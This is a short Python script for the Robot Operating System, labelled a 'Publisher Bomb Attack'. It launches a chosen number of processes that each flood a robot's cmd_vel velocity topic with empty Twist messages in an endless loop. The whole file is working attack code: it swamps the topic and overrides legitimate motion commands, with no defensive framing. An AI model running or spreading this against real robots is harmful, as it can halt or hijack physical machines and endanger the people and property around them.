#!/usr/bin/env python

import rospy
import multiprocessing as mp
import sys

from geometry_msgs.msg import Twist




def attacker(id):
    
    rospy.init_node('attacker' + id, anonymous=True)
    pub = rospy.Publisher('cmd_vel', Twist, queue_size=0)

    while rospy.ROSInterruptException:
        pub.publish(Twist())

def PublisherBombAttack(count):
    print("Publisherz Bomb Attack Started!")
    attackerProcesses = []
    for i in range(count):
        attackerProcesses.append(mp.Process(target=attacker, args=(str(i),)))
        attackerProcesses[i].start()

if __name__ == "__main__":
    args = sys.argv
    
    if len(args) == 2:
        PublisherBombAttack(int(args[1]))
